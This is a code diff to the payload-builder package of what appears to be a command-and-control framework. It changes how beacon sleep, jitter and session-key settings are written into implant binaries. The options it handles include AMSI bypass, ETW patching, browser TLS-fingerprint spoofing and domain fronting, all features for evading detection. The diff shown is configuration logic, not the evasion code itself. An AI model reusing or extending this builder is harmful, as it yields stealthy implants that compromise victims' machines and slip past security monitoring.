@@ -1,6 +1,8 @@
 package delivery
 
 import (
+	"BackendTemplate/pkg/c2profile"
+	"BackendTemplate/pkg/config"
 	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/encrypt"
 	"BackendTemplate/pkg/godonut"
@@ -39,7 +41,7 @@ type PatchOptions struct {
 	// Endpoints 多传输端点列表（"scheme://addr,scheme://addr"，可选）。
 	// 非空时要求模板是多传输构建（含 512 字节定长占位符），等长替换写入。
 	Endpoints     string
-	JitterPercent string // client.jitter（0-50），可选；空则保持占位符原样
+	JitterPercent string // 显式 jitter 覆盖（0-50，可选）；空则按 监听器 > 全局 client.jitter 解析
 	// 主机层对抗（Windows）：ETW Patch / AMSI Bypass / syscall 模式
 	ETWPatch    string // "1"=启用（默认）
 	AmsiBypass  string // "1"=启用（默认）
@@ -72,8 +74,8 @@ type PatchOptions struct {
 	HTTPGetURI     string // http-get 请求路径
 	HTTPPostURI    string // http-post 请求路径
 	WSPath         string // WebSocket 握手路径
-	HeartbeatMs    string // 心跳基准（毫秒，兼容旧；统一后见 SleepSeconds）
-	SleepSeconds   string // beacon sleep 秒数（统一心跳；优先于 listener 配置）
+	HeartbeatMs    string // 画像 sleeptime_ms（毫秒）：第二优先级（监听器未配置时使用）
+	SleepSeconds   string // 显式 sleep 覆盖（秒）：最高优先级（> 监听器 > 画像 > 全局）
 	TLSJA3         string // TLS 指纹名（chrome_120/firefox_121/edge_120/safari_17）
 	DNSLabelPrefix string // DNS 内部标签前缀（与 DNS 监听器同步）
 	SessionKeyInfo string // 会话密钥派生盐上下文（配置 security.session_key_info）
@@ -143,27 +145,30 @@ func PatchClientBinary(binaryData []byte, opt PatchOptions) ([]byte, error) {
 		}
 	}
 
-	// heartbeat = beacon sleep 秒数（统一心跳，CS 单一事实来源）
-	// 默认链：opt.SleepSeconds(显式) > opt.HeartbeatMs 换算(profile 毫秒) > 监听器配置 > 默认 5
-	hbInterval := "10"
+	// beacon 节奏 = sleep 秒数 + jitter 百分比（统一心跳，CS 单一事实来源）。
+	// 优先级：显式参数 > 监听器级配置 > 画像 sleeptime_ms > 全局 client.sleep/jitter > 硬默认。
+	// 监听器级值来自 listener 表新增列（NULL=继承），解析逻辑与监听器列表的
+	// "生效值"共用 delivery.ResolveBeaconSleep/ResolveBeaconJitter，避免 UI 与载荷漂移。
+	beacon := database.ListenerBeaconConfig{SleepSeconds: BeaconUnset, JitterPercent: BeaconUnset}
 	if database.DB() != nil {
-		_, hbInterval = database.GetListenerHeartbeatConfigByAddr(connectAddress, listenerType)
+		beacon = database.GetListenerBeaconConfigByAddr(connectAddress, listenerType)
 	}
-	sleepSeconds := hbInterval
-	if opt.SleepSeconds != "" && opt.SleepSeconds != "0" {
-		if v, err := strconv.Atoi(opt.SleepSeconds); err == nil && v > 0 {
-			sleepSeconds = strconv.Itoa(v)
-		}
-	} else if opt.HeartbeatMs != "" && opt.HeartbeatMs != "0" {
+	// 画像心跳基准（毫秒）：调用方（GenServer）通常已按绑定的画像传入；
+	// WebDelivery/内存注入/迁移等未传时，按监听器绑定的画像补齐。
+	profileMs := 0
+	if opt.HeartbeatMs != "" && opt.HeartbeatMs != "0" {
 		if v, err := strconv.Atoi(opt.HeartbeatMs); err == nil && v > 0 {
-			// profile sleeptime_ms(毫秒) -> 秒，向下取整且至少 1
-			sec := v / 1000
-			if sec < 1 {
-				sec = 1
-			}
-			sleepSeconds = strconv.Itoa(sec)
+			profileMs = v
 		}
 	}
+	if profileMs <= 0 && beacon.Profile != "" {
+		if p := c2profile.Get(beacon.Profile); p != nil {
+			profileMs = p.SleeptimeMs
+		}
+	}
+	sleepSeconds := strconv.Itoa(ResolveBeaconSleep(opt.SleepSeconds, beacon.SleepSeconds, profileMs))
+	jitterPercent := strconv.Itoa(ResolveBeaconJitter(opt.JitterPercent, beacon.JitterPercent))
+
 	hbIntervalPh := "HEARTBEAT_INTERVAL_PLACEHOLDER_12345"
 	hbTimeoutPh := "HEARTBEAT_TIMEOUT_PLACEHOLDER_12345"
 	if err := replaceOrErr(hbIntervalPh, []byte(padRight(sleepSeconds, len(hbIntervalPh)))); err != nil {
@@ -175,12 +180,12 @@ func PatchClientBinary(binaryData []byte, opt PatchOptions) ([]byte, error) {
 	// 忽略错误：模板可能不含该占位符
 	_ = replaceOrErr(hbTimeoutPh, []byte(strings.Repeat(" ", len(hbTimeoutPh))))
 
-	// 抖动百分比：配置文件 client.jitter，best-effort（模板缺失时忽略，与 GenServer 行为一致）
-	if opt.JitterPercent != "" {
-		jitterPh := "JITTER_PERCENT_PLACEHOLDER_12345"
-		// 忽略错误：模板可能不含该占位符
-		_ = replaceOrErr(jitterPh, []byte(padRight(opt.JitterPercent, len(jitterPh))))
-	}
+	// 抖动百分比：**无条件**写入解析结果（模板缺失时 best-effort 忽略）。
+	// 原实现只在 opt.JitterPercent 非空时才替换，而 WebDelivery/内存注入/迁移三条
+	// 路径都不传该参数 —— 占位符残留在 Payload 里会让客户端 VerifyNoPlaceholderResidue
+	// fail-closed 拒绝启动。
+	jitterPh := "JITTER_PERCENT_PLACEHOLDER_12345"
+	_ = replaceOrErr(jitterPh, []byte(padRight(jitterPercent, len(jitterPh))))
 
 	// B8: 域前置/CDN 回源 Host（http/https 客户端专用占位符，未配置时保持占位符以禁用）
 	if opt.FrontHost != "" {
@@ -258,6 +263,15 @@ func PatchClientBinary(binaryData []byte, opt PatchOptions) ([]byte, error) {
 	}
 	if err := replaceOrErr(uaPh, []byte(padRight(ua, len(uaPh)))); err != nil {
 		_ = err // 旧模板无此占位符
+	}
+
+	// 会话密钥派生盐上下文：调用方未显式传时取全局配置。
+	// WebDelivery/注入/迁移原先一律用内置默认；若运维改过 security.session_key_info，
+	// 这些路径生成的载荷派生出另一把会话密钥，命令与回包全部解不开。
+	if opt.SessionKeyInfo == "" {
+		if g := config.GetGlobalConfig(); g != nil && g.Security.SessionKeyInfo != "" {
+			opt.SessionKeyInfo = g.Security.SessionKeyInfo
+		}
 	}
 
 	// Profile 驱动占位符（URI/WS 路径/心跳基准；空值用客户端默认，无条件替换防残留）
